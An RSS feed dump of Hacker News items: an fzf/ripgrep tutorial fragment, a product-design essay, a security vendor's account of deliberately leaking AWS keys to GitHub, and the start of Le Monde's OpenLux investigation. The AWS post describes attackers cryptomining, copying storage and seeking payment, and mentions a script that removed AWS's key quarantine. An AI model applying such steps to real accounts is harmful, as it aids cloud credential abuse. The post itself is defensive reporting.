<span>;</span>
</code></pre></div></div>

<p>So let’s see what <code>rg</code> gives us:</p>

<div><div><pre><code><span># /tmp/teched2020-developer-keynote (main *=)</span>
<span>;</span> rg <span>--files</span> | <span>wc</span> <span>-l</span>
     163
<span># /tmp/teched2020-developer-keynote (main *=)</span>
<span>;</span>
</code></pre></div></div>

<p>That is certainly a huge difference, mostly a result of ignoring a load of stuff - not least in the various <code>node_modules/</code> directories within the repository.</p>

<p><a name="showing-hidden-files"></a>
<strong>Showing hidden files</strong></p>

<p>Now that the list of choices is more manageable, I can now start to think about what it actually contains, and what it doesn’t contain. There are hidden files in the repository that I actually want to be able to select. <code>fzf</code>’s default behaviour is preventing that from happening, but it’s only now that my head is clear enough to address this (looking through a list of 17000+ files fogged my thinking).</p>

<p>So I remember I can use the <code>--hidden</code> option with <code>rg</code>; let’s try that:</p>

<div><div><pre><code><span># /tmp/teched2020-developer-keynote (main *=)</span>
<span>;</span> rg <span>--files</span> <span>--hidden</span> | <span>wc</span> <span>-l</span>
     209
<span># /tmp/teched2020-developer-keynote (main *=)</span>
<span>;</span>
</code></pre></div></div>

<p>OK, so a few more than the 163 that <code>rg --files</code> returned. Good stuff. But what are those extra …</p></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://qmacro.org/autodidactics/2021/02/07/fzf-the-basics-2-search-results/">https://qmacro.org/autodidactics/2021/02/07/fzf-the-basics-2-search-results/</a></em></p>]]>
            </description>
            <link>https://qmacro.org/autodidactics/2021/02/07/fzf-the-basics-2-search-results/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26064675</guid>
            <pubDate>Mon, 08 Feb 2021 14:13:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[To Make a Great Product, Stop Copying Google]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26064613">thread link</a>) | @brandonsax
<br/>
February 8, 2021 | https://brandonsax.com/stop-copying-google | <a href="https://web.archive.org/web/*/https://brandonsax.com/stop-copying-google">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div>
<div>
<div>
<p>“That’s not what Google’s doing!” is a phrase I’ve heard all too often in my career to criticize product solutions. It’s a preposterous statement because it implies that decisions differing from Google's are inherently wrong, and must be righted by copying their solution pixel for pixel. The problem is that doing so doesn’t often lead to success, for a wide variety of reasons.&nbsp;</p>



<p>The first is simply because no one is going to beat Google at Google. They’re operating at a completely different scale, with limitless resources, in a unique position in the marketplace, and are almost certainly offering a unique product. Copying them just ensures you’re permanently behind. By the time the copier designs, builds, markets, and releases their copy, Google or any other competitor will have improved further, and have continued to win a larger pie of the market.&nbsp;</p>



<p>Don’t get me wrong, Google has a long track record of consistently launching successful products. Google Stadia seems to be <a href="https://www.cnn.com/2021/02/01/tech/google-stadia-sge-shutdown/index.html" target="_blank" rel="noreferrer noopener">going really well</a>, Google+ had <a href="https://www.techtimes.com/articles/51205/20150506/many-users-google-really.htm#:~:text=Officially%2C%20Google%2B%20has%20more%20than,as%20many%20members%20as%20Facebook." target="_blank" rel="noreferrer noopener">a billion users</a>, Google Wave was basically <a href="https://gizmodo.com/what-in-the-hell-was-google-wave-trying-to-be-anyway-1835038967" target="_blank" rel="noreferrer noopener">Slack before Slack</a>, and Google Glass is apparently <a href="https://www.google.com/glass/start/https://www.google.com/glass/start/" target="_blank" rel="noreferrer noopener">still a thing</a>! The reality is that Alphabet is mega successful because the vast majority of its revenue comes from its advertising platform, which primarily earns cash off of its first product… Google Search.</p>



<p>But what about Material Design? I know I’ve established my ability for sarcasm but Material Design is actually a fantastic design system, and they keep improving it. In late 2019, Google performed hundreds of usability testing sessions and hundreds of preference ranking sessions to investigate the usability and accessibility of their form fields. <a rel="noreferrer noopener" href="https://medium.com/google-design/the-evolution-of-material-designs-text-fields-603688b3fe03" data-type="URL" data-id="https://medium.com/google-design/the-evolution-of-material-designs-text-fields-603688b3fe03" target="_blank">The results</a> showed that their form fields performed poorly, especially when filled with large amounts of text.</p>



<figure><img loading="lazy" src="https://brandonsax.com/wp-content/uploads/2021/02/0_yTxoZXR5wDzrAj5D-1.png" alt="" width="1024" height="329"><figcaption>Google's old form fields (left) and one of their improved test versions (right) </figcaption></figure>



<p>Afterwards, some writers called out that Google <a href="https://www.matsuko.ca/blog/stop-using-material-design-text-fields/" target="_blank" rel="noreferrer noopener">got it wrong</a>, but I know that Google didn’t know any better. If only I had applied to Google on April 3, 2016 and documented the usability opportunities of their form fields, specifically within their application experience. Oh wait, I had. Let’s read those receipts, shall we?</p>



<p>“There is little visual distinction between subsections, such as in individual jobs. This leads to confusion when identifying which details pertain to which job, especially when the user is in the midst of input. This problem is exacerbated by the large distance between individual fields, and that distance also is inconsistent within subsections.” (Bless up to Evernote for saving this.) Google could have saved all that money and effort had they actually read my application three and a half years earlier. Just saying! I’m not bitter! Really!</p>



<h4>Bare Minimum</h4>



<p>“This is industry standard,” is the broader example of copying Google, and when the phrase is used to defend work to stakeholders, it’s typically followed by heads around the room nodding along, either in bliss knowing that the solution has been soundly justified, or in fear of questioning the status quo. The problem is apparent in the term itself. "Industry standard” means “the&nbsp;generally accepted <em>requirements</em> followed by the members of an industry.” So when you justify a decision with that, you’re aiming for the bare minimum, probably because it’s easy, acceptable, and doesn’t rock the boat. Just know that aiming for that low bar doesn’t lead to market success.&nbsp;</p>



<figure><img loading="lazy" width="1024" height="690" src="https://brandonsax.com/wp-content/uploads/2021/01/group-of-smiling-people-1024x690.jpg" alt="" srcset="https://brandonsax.com/wp-content/uploads/2021/01/group-of-smiling-people-1024x690.jpg 1024w, https://brandonsax.com/wp-content/uploads/2021/01/group-of-smiling-people-300x202.jpg 300w, https://brandonsax.com/wp-content/uploads/2021/01/group-of-smiling-people-768x518.jpg 768w, https://brandonsax.com/wp-content/uploads/2021/01/group-of-smiling-people.jpg 1280w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Stakeholders when they hear that something is industry standard.</figcaption></figure>



<p>Of course there are obvious exceptions. I’m happy there are construction standards so buildings have fire escapes, don’t collapse, and accommodate all people. As a product designer, I’m happy there are standard patterns so engrained into user’s behavior that if I leverage those patterns, users will already know how to use the product, like a navigation bar or form field. That said, a standard building isn’t going to garner any awards for sustainability or architecture, and I still have to make decisions regarding how more complex functionality should be displayed to the user while making the experience feel intuitive.&nbsp;</p>



<h4>Is it really industry standard?</h4>



<p>I question whether “That is industry standard” is even true. Was industry research actually performed by evaluating the competition, summarizing the pros and cons of each approach, and arriving at a conclusion to copy a competitor? In most cases the answer is no. It’s a convenient argument in the moment because it’s one less thing for the speaker to do. Their time saved on research and thinking is paid for with the opportunity-cost of innovation, preventing the speaker from leapfrogging the competition and radically improving an area of the industry.&nbsp;</p>



<figure><img loading="lazy" width="1024" height="576" src="https://brandonsax.com/wp-content/uploads/2021/01/EOQKV1sUUAArdKN-1024x576.jpg" alt="" srcset="https://brandonsax.com/wp-content/uploads/2021/01/EOQKV1sUUAArdKN-1024x576.jpg 1024w, https://brandonsax.com/wp-content/uploads/2021/01/EOQKV1sUUAArdKN-300x169.jpg 300w, https://brandonsax.com/wp-content/uploads/2021/01/EOQKV1sUUAArdKN-768x432.jpg 768w, https://brandonsax.com/wp-content/uploads/2021/01/EOQKV1sUUAArdKN.jpg 1200w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Kirk Goldsberry, Top 200 Shot Locations in the NBA</figcaption></figure>



<p>If you dig into the history of why something is standard, you may uncover that the solution has never been carefully considered, like how until ten years ago, professional basketball players took their shots on the court in remarkably inefficient places. It could also be that the standard hasn’t kept up with technological advancements, like Nuclear power. Almost all power plants in existence today are based off designs made with slide rulers, not computers, and are ripe for innovation. Either way, real problems may exist in the status quo that have been ignored or people grew blind to. If you’re coming into a new project, you’re at the perfect time to reevaluate assumptions and innovate. It’s much cheaper to consider something in the research and design phase than once it’s built and you need to shoehorn a solution in.&nbsp;</p>



<h4>Psychology of Industry Standard</h4>



<p>The urge to copy big brands comes from heuristics. Heuristics are basically mental shortcuts, and the study of them tells us that humans are risk-adverse and cognitively lazy. We see something that works and instinctively copy it to avoid failure, which has the added benefit of conserving our cognitive load. At Google’s scale their product decisions also become the “default” in many people’s minds, and deviating from that is scary, but ironically copying a large institution like Google <a href="https://www.nngroup.com/articles/risks-imitating-designs/" target="_blank" rel="noreferrer noopener">brings a high risk of failure</a>. It’s like copying the winning lottery numbers from two days ago; it’s a verbatim repeat of successful steps but in a completely different set of circumstances. It’s not any more likely to work than anything else.&nbsp;</p>



<h4>Conclusion</h4>



<p>For a product to have success, it’s critical for it to have a unique market fit, and the way to do that is to make your own decisions. Evaluate your unique situation and build accordingly. Each product has unique qualities that earn customers, and success is earned through empowering those customers to succeed while generating value for the business.</p>
</div>
</div>
</div></div></div>]]>
            </description>
            <link>https://brandonsax.com/stop-copying-google</link>
            <guid isPermaLink="false">hacker-news-small-sites-26064613</guid>
            <pubDate>Mon, 08 Feb 2021 14:08:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What happened after we purposely leaked AWS keys to a public GitHub repo]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26064317">thread link</a>) | @darkport
<br/>
February 8, 2021 | https://www.shhgit.com/blog/keep-it-secret-keep-it-safe/ | <a href="https://web.archive.org/web/*/https://www.shhgit.com/blog/keep-it-secret-keep-it-safe/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="___gatsby"><div tabindex="-1" id="gatsby-focus-wrapper"><nav></nav><section><div><div><p>Accidentally leaking secrets — usernames and passwords, API tokens, or private keys — in a public code repository is a developers and security teams worst nightmare. Fraudsters constantly scan public code repositories for these secrets to gain a foothold in to systems. Code is more connected than ever so often these secrets provide access to private and sensitive data — cloud infrastructures, database servers, payment gateways, and file storage systems to name a few. But what happens <em>after</em> a secret is leaked? And what is the potential fallout?</p>
<h4>
Fraudsters compromised our cloud infrastructure in less than a minute after leaking AWS keys to a public GitHub repository
</h4>
<p>One thing is for certain: the fallout can be catastrophic in terms of financial loss and reputational damage. The now-infamous Uber data breach of 2016 was the result of an engineer accidentally uploading credentials to a public GitHub repository. These credentials allowed bad actors to access Uber's backend databases and confidential information. This breach ultimately resulted in a then-record-breaking <a href="https://www.theguardian.com/technology/2018/sep/26/uber-hack-fine-driver-data-breach" target="_blank" rel="nofollow">$148 million fine</a> — ouch.</p>
<p>More recently, the sophisticated hack against IT management software giant SolarWinds could of originated from <a href="https://www.theregister.com/2020/12/16/solarwinds_github_password/" target="_blank" rel="nofollow">exposed file server credentials in an engineers GitHub repository</a>. This supply-chain attack and the resulting fallout will go down as one of the largest in history, joining the likes of WannaCry. The hack affected over 18,000 SolarWinds customers including various US federal agencies and tech-giants such as Microsoft and FireEye. As news of the hack broke, SolarWinds saw it's market cap cut in half and fall by billions of dollars after it's share price dipped below pre-IPO levels.</p>
<p><span>
<a href="https://www.shhgit.com/static/a02e1e085d3ec8b1803ec7a913eea10e/9fc2b/solarwinds.jpg" target="_blank" rel="noopener">
<span></span>
<picture>
<source srcset="https://www.shhgit.com/static/a02e1e085d3ec8b1803ec7a913eea10e/28a80/solarwinds.webp 400w,
https://www.shhgit.com/static/a02e1e085d3ec8b1803ec7a913eea10e/23d72/solarwinds.webp 652w" sizes="(max-width: 652px) 100vw, 652px" type="image/webp">
<source srcset="https://www.shhgit.com/static/a02e1e085d3ec8b1803ec7a913eea10e/4cda9/solarwinds.jpg 400w,
https://www.shhgit.com/static/a02e1e085d3ec8b1803ec7a913eea10e/9fc2b/solarwinds.jpg 652w" sizes="(max-width: 652px) 100vw, 652px" type="image/jpeg">
<img src="https://www.shhgit.com/static/a02e1e085d3ec8b1803ec7a913eea10e/9fc2b/solarwinds.jpg" alt="solarwinds" title="solarwinds" loading="lazy">
</picture>
</a>
</span></p>
<p>Thankfully these hard-hitting headlines are the exception and not the rule. We can look to publicly disclosed reports on bug bounty platforms such as HackerOne to get a feel for how often these secrets are being found and reported. At least by the good guys. These three reports from 2020 could easily have been a front page headline or resulted in huge regulatory fines — they got lucky.</p>
<ol>
<li>The <strong><a href="https://hackerone.com/reports/799898" target="_blank" rel="nofollow">U.S. Department of Defense</a></strong> exposed administrative credentials of their GitLab Enterprise server on GitHub, allowing access to their private code repositories.</li>
<li>Not for the first time, leaked credentials on GitHub from <strong><a href="https://hackerone.com/reports/694931" target="_blank" rel="nofollow">Equifax</a></strong> allowed for access to an API endpoint exposing PII information of Costa Rican citizens.</li>
<li><strong><a href="https://hackerone.com/reports/858915" target="_blank" rel="nofollow">Shopify</a></strong>'s leakage of a CircleCI API token on GitHub allowed for further access to private code repositories and their secrets within.</li>
</ol>
<p>Finding these secrets is what we do. Shhgit finds <strong>over 165,000 secrets every day single</strong> across public GitHub, GitLab and Bitbucket repositories. More than half of these are valid and live. And our data suggests it is an ever increasing problem that often goes unnoticed. You can catch a small glimpse of the scale of the problem <a href="https://www.shhgit.com/#product" target="_blank" rel="nofollow">on our homepage</a>:</p>
<p><img src="https://www.shhgit.com/235b382bba432df2fdeadf8cd47ae7d9/publicfeed.gif"></p>
<h4>Code as an attack vector</h4>
<p>But what happens immediately after leaking secrets? To find out we purposely leaked valid Amazon AWS credentials to a public GitHub repository. We chose to leak AWS keys because we know they are highly sought after by fraudsters with all sorts of different motives — espionage, spamming, financial gain or blackmail. But we didn't quite realise how quickly it would happen...</p>
<p>We wanted to limit our liabilities as much as possible, even though we used a new AWS account loaded with free credits. We definitely do not want to be end up <a href="https://www.quora.com/My-AWS-account-was-hacked-and-I-have-a-50-000-bill-how-can-I-reduce-the-amount-I-need-to-pay" target="_blank" rel="nofollow">footing a huge bill</a> for this experiment. AWS' Cost Management tool alerts you if you go over a set budget but it will not stop you from going past it. To be on the safe side we created a script to automatically destroy any new EC2 instances <em>(servers)</em> shortly after their creation. This gives us enough time to forensically capture the server and analyse what the hackers were doing.</p>
<ol>
<li>
<p><strong>(15:12 UTC)</strong> First, we created a new <abbr title="AWS' Identity and Access Management tool">IAM</abbr> user and attached basic <abbr title="AWS' file storage platform known as buckets">S3</abbr> read and <abbr title="A fancy name for servers">EC2</abbr> policies. This means the account will only have permissions to access our file storage and spin up new cloud servers. We then published the AWS secret keys to a new GitHub repository.</p>
<p><span>
<a href="https://www.shhgit.com/static/0c9f9f2f7af3b78e9ff4d1c4fa10e3d6/a1d0e/awsfile.jpg" target="_blank" rel="noopener">
<span></span>
<picture>
<source srcset="https://www.shhgit.com/static/0c9f9f2f7af3b78e9ff4d1c4fa10e3d6/28a80/awsfile.webp 400w,
https://www.shhgit.com/static/0c9f9f2f7af3b78e9ff4d1c4fa10e3d6/1a67c/awsfile.webp 606w" sizes="(max-width: 606px) 100vw, 606px" type="image/webp">
<source srcset="https://www.shhgit.com/static/0c9f9f2f7af3b78e9ff4d1c4fa10e3d6/4cda9/awsfile.jpg 400w,
https://www.shhgit.com/static/0c9f9f2f7af3b78e9ff4d1c4fa10e3d6/a1d0e/awsfile.jpg 606w" sizes="(max-width: 606px) 100vw, 606px" type="image/jpeg">
<img src="https://www.shhgit.com/static/0c9f9f2f7af3b78e9ff4d1c4fa10e3d6/a1d0e/awsfile.jpg" alt="awsfile" title="awsfile" loading="lazy">
</picture>
</a>
</span></p>
</li>
<li>
<p><strong>(15:16 UTC)</strong> Just four minutes later we receive an e-mail from the AWS team notifying us of the exposed credentials — neat!</p>
<p><span>
<a href="https://www.shhgit.com/static/7fa5af71ce105cb60dbfa2f34b4da73e/b51e2/awsemail.jpg" target="_blank" rel="noopener">
<span></span>
<picture>
<source srcset="https://www.shhgit.com/static/7fa5af71ce105cb60dbfa2f34b4da73e/28a80/awsemail.webp 400w,
https://www.shhgit.com/static/7fa5af71ce105cb60dbfa2f34b4da73e/2aac6/awsemail.webp 694w" sizes="(max-width: 694px) 100vw, 694px" type="image/webp">
<source srcset="https://www.shhgit.com/static/7fa5af71ce105cb60dbfa2f34b4da73e/4cda9/awsemail.jpg 400w,
https://www.shhgit.com/static/7fa5af71ce105cb60dbfa2f34b4da73e/b51e2/awsemail.jpg 694w" sizes="(max-width: 694px) 100vw, 694px" type="image/jpeg">
<img src="https://www.shhgit.com/static/7fa5af71ce105cb60dbfa2f34b4da73e/b51e2/awsemail.jpg" alt="awsemail" title="awsemail" loading="lazy">
</picture>
</a>
</span></p>
<p>Amazon automatically revokes exposed keys by applying a special policy called <em>AWSCompromisedKeyQuarantine</em>. This effectively prevents bad actors from using the key. But it somewhat renders our experiment useless if the keys can't be used. We knew this would happen beforehand so we created a simple script to automatically remove the quarantine policy if found <em>(tip: never do this)</em>. Now we just wait for fraudsters to take the bait.</p>
</li>
<li>
<p><strong>(15:17 UTC)</strong> Shhgit happened to be monitoring all activity by the user who leaked the secrets, so a minute later we received an e-mail alert of the leak.</p>
<p><span>
<a href="https://www.shhgit.com/static/c43a81a0966d6d44ded48732c28ae234/c9cc5/shhgitemail.jpg" target="_blank" rel="noopener">
<span></span>
<picture>
<source srcset="https://www.shhgit.com/static/c43a81a0966d6d44ded48732c28ae234/28a80/shhgitemail.webp 400w,
https://www.shhgit.com/static/c43a81a0966d6d44ded48732c28ae234/8d2ea/shhgitemail.webp 800w,
https://www.shhgit.com/static/c43a81a0966d6d44ded48732c28ae234/3c863/shhgitemail.webp 861w" sizes="(max-width: 861px) 100vw, 861px" type="image/webp">
<source srcset="https://www.shhgit.com/static/c43a81a0966d6d44ded48732c28ae234/4cda9/shhgitemail.jpg 400w,
https://www.shhgit.com/static/c43a81a0966d6d44ded48732c28ae234/c60e9/shhgitemail.jpg 800w,
https://www.shhgit.com/static/c43a81a0966d6d44ded48732c28ae234/c9cc5/shhgitemail.jpg 861w" sizes="(max-width: 861px) 100vw, 861px" type="image/jpeg">
<img src="https://www.shhgit.com/static/c43a81a0966d6d44ded48732c28ae234/c9cc5/shhgitemail.jpg" alt="shhgitemail" title="shhgitemail" loading="lazy">
</picture>
</a>
</span></p>
</li>
<li>
<p><strong>(15:18 UTC)</strong> A minute later we detected a flurry of activity on the key from an IP address based in the Netherlands. Threat intelligence feeds associates the IP address with spamming, exploitation of Windows hosts, and running a TOR exit node.</p>
<p><span>
<a href="https://www.shhgit.com/static/8f793f6046be566f7ee72e44db54b72e/6dbf2/awslog.jpg" target="_blank" rel="noopener">
<span></span>
<picture>
<source srcset="https://www.shhgit.com/static/8f793f6046be566f7ee72e44db54b72e/28a80/awslog.webp 400w,
https://www.shhgit.com/static/8f793f6046be566f7ee72e44db54b72e/8d2ea/awslog.webp 800w,
https://www.shhgit.com/static/8f793f6046be566f7ee72e44db54b72e/ca0c9/awslog.webp 1093w" sizes="(max-width: 1093px) 100vw, 1093px" type="image/webp">
<source srcset="https://www.shhgit.com/static/8f793f6046be566f7ee72e44db54b72e/4cda9/awslog.jpg 400w,
https://www.shhgit.com/static/8f793f6046be566f7ee72e44db54b72e/c60e9/awslog.jpg 800w,
https://www.shhgit.com/static/8f793f6046be566f7ee72e44db54b72e/6dbf2/awslog.jpg 1093w" sizes="(max-width: 1093px) 100vw, 1093px" type="image/jpeg">
<img src="https://www.shhgit.com/static/8f793f6046be566f7ee72e44db54b72e/6dbf2/awslog.jpg" alt="awslog" title="awslog" loading="lazy">
</picture>
</a>
</span></p>
<p>The first batch of commands helps the attacker understand the lay of the land. Shortly after the bad actor spun-up two <em>c6g.16xlarge</em> EC2 instances — AWS' most powerful compute instance. Undetected this would have costed us thousands of dollars a month. Any guesses on motives?</p>
<p>Cryptomining.</p>
<p>We analysed the server afterwards and it was a base install of Ubuntu with XMRig installed which is used to mine for $XMR (Monero) — nothing overly exciting.</p>
</li>
<li>
<p><strong>(15:54 UTC)</strong> Shortly after, another actor with an Israeli residential IP address used the secrets to access our S3 buckets (file storage) and download its entire contents (which we filled with random data). We booby-trapped some of the files with tracking pixels but unfortunately none of them triggered.</p>
<p><span>
<a href="https://www.shhgit.com/static/1229fc77fa8ab68c2a2bd683598873f8/06ced/awsbuckets.jpg" target="_blank" rel="noopener">
<span></span>
<picture>
<source srcset="https://www.shhgit.com/static/1229fc77fa8ab68c2a2bd683598873f8/28a80/awsbuckets.webp 400w,
https://www.shhgit.com/static/1229fc77fa8ab68c2a2bd683598873f8/8d2ea/awsbuckets.webp 800w,
https://www.shhgit.com/static/1229fc77fa8ab68c2a2bd683598873f8/a5086/awsbuckets.webp 942w" sizes="(max-width: 942px) 100vw, 942px" type="image/webp">
<source srcset="https://www.shhgit.com/static/1229fc77fa8ab68c2a2bd683598873f8/4cda9/awsbuckets.jpg 400w,
https://www.shhgit.com/static/1229fc77fa8ab68c2a2bd683598873f8/c60e9/awsbuckets.jpg 800w,
https://www.shhgit.com/static/1229fc77fa8ab68c2a2bd683598873f8/06ced/awsbuckets.jpg 942w" sizes="(max-width: 942px) 100vw, 942px" type="image/jpeg">
<img src="https://www.shhgit.com/static/1229fc77fa8ab68c2a2bd683598873f8/06ced/awsbuckets.jpg" alt="awsbuckets" title="awsbuckets" loading="lazy">
</picture>
</a>
</span></p>
</li>
<li>
<p>One attacker who copied the files from our S3 buckets started a live chat conversation through the shhgit.com homepage (the bucket was named shhgit) — a snippet of the conversation below.</p>
<p><span>
<a href="https://www.shhgit.com/static/7a1eccea19e7da00956ba26fd97a5ab9/cca8c/chat.jpg" target="_blank" rel="noopener">
<span></span>
<picture>
<source srcset="https://www.shhgit.com/static/7a1eccea19e7da00956ba26fd97a5ab9/28a80/chat.webp 400w,
https://www.shhgit.com/static/7a1eccea19e7da00956ba26fd97a5ab9/60ad7/chat.webp 568w" sizes="(max-width: 568px) 100vw, 568px" type="image/webp">
<source srcset="https://www.shhgit.com/static/7a1eccea19e7da00956ba26fd97a5ab9/4cda9/chat.jpg 400w,
https://www.shhgit.com/static/7a1eccea19e7da00956ba26fd97a5ab9/cca8c/chat.jpg 568w" sizes="(max-width: 568px) 100vw, 568px" type="image/jpeg">
<img src="https://www.shhgit.com/static/7a1eccea19e7da00956ba26fd97a5ab9/cca8c/chat.jpg" alt="chat" title="chat" loading="lazy">
</picture>
</a>
</span></p>
<p>Ultimately this ends up in a demand for money to pay him for his services in finding the 'bug'. We politely declined his generous offer. We believe this could have quickly turned in to an extortion attempt if the files were worth any value.</p>
</li>
<li>In total, the leaked secrets were used to access the AWS account 13 times over a 24 hour period. 4 of the attackers carried out actions similar to the above. The remaining 9 seemingly only verified if the credentials were valid (i.e. check if they could login). We presume to be either manually reviewed later or sold on a darknet forum.</li>
</ol>
<h4>6 minutes to compromise</h4>
<p>It look just 6 minutes for the malicious actor to find the leaked credentials on GitHub and compromise our AWS account. So why did we say 'in less than a minute' at the beginning of the post? Attacks like this are made possible by GitHub's "real time" feed. Every fork, code commit, comment, issue and pull request is fed in to a public events stream. Bad actors watch this stream to identify new code and scan it for secrets. GitHub delays the feed by 5 minutes — presumably for security reasons — making the <strong>earliest</strong> possible time a bad actor could have captured the secrets 15:17 UTC, 5 minutes after committing them.</p>
<h4>Keeping <em>your</em> secrets, secret</h4>
<p>Fraudsters <em>are</em> scanning public code repositories for your secrets. They are counting on you, or your team, or your suppliers, or your contractors, to mess up and take full advantage of it. As with all security controls, a defence in depth approach is always best so consider implementing the following:</p>
<ol>
<li>Don't put your secrets in your code in the first place. Secrets Management solutions such as <a href="https://www.vaultproject.io/use-cases/secrets-management" target="_blank" rel="nofollow">HashiCorp Vault</a> can help you here — think environment variables crossed with your password manager in your CI/CD pipelines.</li>
<li>Whilst Amazon caught and revoked our AWS keys shortly after them being committed, this isn't true for all secret types (e.g., database connection strings) or platforms (e.g., GitLab and Bitbucket). Strengthen your DevSecOps strategy with automated secrets detection to alert you if shhgit hits the fan. We happen to be really good at that.</li>
<li>Gain visibility of your code and understand where it sits and how it is secured. This is especially true if you have large teams or contractors distributed across many systems. A good first step is to monitor public GitHub, GitLab and Bitbucket streams. We happen to be really good at that too.</li>
<li>Implement the principle of least privilege across your secrets. Only grant them permissions needed to carry out their specific function and ensure they are only valid for as short as possible. Implement a zero trust model and plan for the worse by taking the position that your secrets <em>will</em> be breached. This will greatly mitigate the impact if any secrets are leaked.</li>
</ol></div></div></section><section><div><h3>About shhgit</h3><p>We help secure forward-thinking development, operations, and security teams by finding secrets across their code before it leads to a security breach.</p></div></section><section><div><div><h3>Fancy some special shhgit swag?</h3><p>Of course you do! Share how you are using shhgit for a chance to receive some awesome swag.</p><div><div><p>No spam, ever. And we'll keep it secret — we're quite good at that.</p></div></div></div></div></section></div></div></div>]]>
            </description>
            <link>https://www.shhgit.com/blog/keep-it-secret-keep-it-safe/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26064317</guid>
            <pubDate>Mon, 08 Feb 2021 13:45:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[OpenLux: Luxembourg, a tax haven at the heart of Europe]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26063298">thread link</a>) | @viviansolide
<br/>
February 8, 2021 | https://www.lemonde.fr/les-decodeurs/article/2021/02/08/openlux-the-secrets-of-luxembourg-a-tax-haven-at-the-heart-of-europe_6069140_4355770.html | <a href="https://web.archive.org/web/*/https://www.lemonde.fr/les-decodeurs/article/2021/02/08/openlux-the-secrets-of-luxembourg-a-tax-haven-at-the-heart-of-europe_6069140_4355770.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="Longform">  <section> <figure>  <img src="https://img.lemde.fr/2021/02/05/0/12/1776/888/768/384/75/0/ad4452f_499055256-ccac866-973257687-cover-papier-tete-1.png" srcset="https://img.lemde.fr/2021/02/05/0/12/1776/888/1024/512/75/0/ad4452f_499055256-ccac866-973257687-cover-papier-tete-1.png 1024w, https://img.lemde.fr/2021/02/05/0/12/1776/888/1440/720/75/0/ad4452f_499055256-ccac866-973257687-cover-papier-tete-1.png 1440w, https://img.lemde.fr/2021/02/05/0/12/1776/888/2048/1024/45/0/ad4452f_499055256-ccac866-973257687-cover-papier-tete-1.png 2048w, https://img.lemde.fr/2021/02/05/0/12/1776/888/2880/1440/45/0/ad4452f_499055256-ccac866-973257687-cover-papier-tete-1.png 2880w" sizes="(max-width: 1440px) 1024px, 1440px" alt="" title="Julien Pacaud" width="768" height="384">   <figcaption> Julien Pacaud </figcaption> </figure> </section>  <section>     <span>Par   <a href="https://www.lemonde.fr/signataires/anne-michel/">Anne Michel</a> ,   <a href="https://www.lemonde.fr/signataires/maxime-vaudano/">Maxime Vaudano</a> ,   <a href="https://www.lemonde.fr/signataires/jeremie-baruch/">Jérémie Baruch</a>  et   <a href="https://www.lemonde.fr/signataires/maxime-ferrer/">Maxime Ferrer</a> </span>  <p>Publié le 08 février 2021 à 06h00 - Mis à jour le 09 février 2021 à 22h56</p>  <section> <section>     </section> <section><p><span>Enquête</span>Multinationals, billionaires, artists, sportsmen, criminals&nbsp;: an investigation by Le Monde reveals for the first time exhaustively what the Grand Duchy’s financial centre conceals, thanks to its tax advantages.</p></section> </section> </section> <section>                              <p>It is a well-kept secret, a persistent mystery, a question that has been unresolved for years&nbsp;: what is the financial centre in Luxembourg hiding&nbsp;? What would we find if we opened the safe of this tiny State located in the heart of the European Union, listed by many researchers in the world’s top&nbsp;5 tax havens&nbsp;? The OpenLux investigation, conducted by <em>Le Monde</em> along with ten media partners for more than a year, provides answers&nbsp;: 55,000&nbsp;offshore companies managing assets worth at least 6&nbsp;trillion euros.</p>          <p>These phantom companies without offices or employees were created by billionaires, multinationals, sportsmen, artists, high-ranking politicians and even royal families. Luxembourg acts as a magnet for the wealth of the world&nbsp;: in a territory of 2,586&nbsp;km2, Tiger Woods and Cristiano Ronaldo rub shoulders with Shakira and the King of Bahrain. Hundreds of multinationals (LVMH, Kering, Altice, Pfizer, Amazon…) have opened financial subsidiaries. Wealthy families increase their real estate assets there.</p>            <p>More surprisingly, OpenLux reveals that questionable funds, suspected of originating in criminal activity or linked to criminals targeted by judicial investigations, have been concealed in Luxembourg. This is the case of companies linked to the Italian Mafia, the’Ndrangheta, and the Russian underworld. The League, Italy’s far-right party, has hidden a secret fund which is sought by the Italian authorities. People close to the Venezuelan regime have recycled corrupt government procurement funds.</p>          <p>To conduct this investigation, <em>Le Monde </em>has compiled a huge database that lists the beneficiaries of the 124.000&nbsp;commercial companies registered in Luxembourg, i.e. their true owners, along with 3.3&nbsp;million administrative acts and financial reports. These are documents that have recently been made public, but are only available on the Luxembourg trade register website. <em>Le Monde </em>was able to extract them in their entirety for analysis, in partnership with the <em>Suddeutsche</em> <em>Zeitung </em>in Germany, <em>Le Soir</em> in Belgium, McClatchy in the United States, Woxx in Luxembourg, <em>IrpiMedia</em> in Italy, and the OCCRP Consortium of investigative journalists.</p>          <h2>157 nationalities represented</h2>          <p>These investigations confirm that the Grand Duchy is, contrary to what the Luxembourg authorities claim, a veritable offshore centre, halfway between the City of London and the British Virgin Islands. Nearly 90&nbsp;% of its <em>«&nbsp;companies&nbsp;»</em> are controlled by non-Luxembourgers. Among the 157&nbsp;nationalities represented in this amazing <em>«&nbsp;Who’s who&nbsp;»</em>, the French stand out&nbsp;: they head the list with, in total, more than 17.000 companies<strong>.</strong></p>            <p>What they house is surprising&nbsp;: valuable property, here a castle near Paris owned by a Saudi prince, there a vineyard in Provence owned by Angelina Jolie and Brad Pitt, and an endless list of villas on the French Riviera and well-appointed Parisian apartments. But also flagships of the French economy, such as Yves Rocher, Chanel, JCDecaux and Decathlon. It’s almost as if Luxembourg owned small pieces of France.</p>                     <p>The case of France is not isolated&nbsp;: it is also through Luxembourg companies that some investment funds buy whole swathes of cities such as Berlin and London, causing real estate prices to rocket without being identifiable or paying taxes. The list of 